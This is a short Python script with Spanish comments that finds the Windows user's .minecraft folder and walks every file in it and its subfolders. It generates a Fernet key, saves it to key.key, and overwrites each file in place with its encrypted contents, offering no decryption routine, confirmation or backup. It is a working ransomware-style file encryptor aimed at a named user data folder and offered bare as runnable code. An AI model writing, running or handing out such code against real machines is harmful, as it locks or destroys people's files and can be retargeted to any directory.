from cryptography.fernet import Fernet
import os

# Ruta de .minecraft automáticamente
minecraft_path = os.path.join(os.getenv("APPDATA"), ".minecraft")

def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(items, key):
    f = Fernet(key)
    for x in items:
        if os.path.isfile(x):  # Solo archivos, no carpetas
            with open(x, "rb") as file:
                file_data = file.read()
            data = f.encrypt(file_data)
            with open(x, "wb") as file:
                file.write(data)

if __name__ == "__main__":
    # Listar todos los archivos dentro de .minecraft y subcarpetas
    archivos = []
    for root, dirs, files in os.walk(minecraft_path):
        for file in files:
            archivos.append(os.path.join(root, file))

    generarKey()
    key = retornarKey()
    encryp(archivos, key)

    print("Encriptación completa.")
